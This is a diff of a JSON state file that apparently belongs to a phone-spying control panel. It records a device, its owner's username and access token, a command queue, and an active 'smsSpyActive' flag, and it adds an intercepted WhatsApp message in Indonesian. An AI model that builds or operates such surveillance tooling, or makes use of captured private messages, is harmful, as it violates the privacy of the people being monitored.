@@ -4,7 +4,7 @@
     "deviceName": "HP-SANGEAN-6B64",
     "ownerUsername": "KUDANIL",
     "token": "3020da2f0f6d9f81513d32cd8944bd59",
-    "lastSeen": 1775228074919,
+    "lastSeen": 1775228077928,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-02T14:28:53.779Z",
@@ -7703,6 +7703,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Meta AI",
+        "content": "Haha, serius nih? 😅 Oke, secara biologis:\n1. Hubungan intim antara laki-laki dan perempuan\n2. Sperma bertemu dengan sel telur\n3. Pembuahan terjadi\n4. Embrio berkembang jadi janin\n5. Janin lahir jadi bayi\n\nTapi kayaknya kamu mau tanya yang lain deh. Mau bahas lebih lanjut? 😊",
+        "time": "03/04 21:54",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775228078211
+      },
       {
         "appName": "WhatsApp",
         "sender": "Joni besar wd",
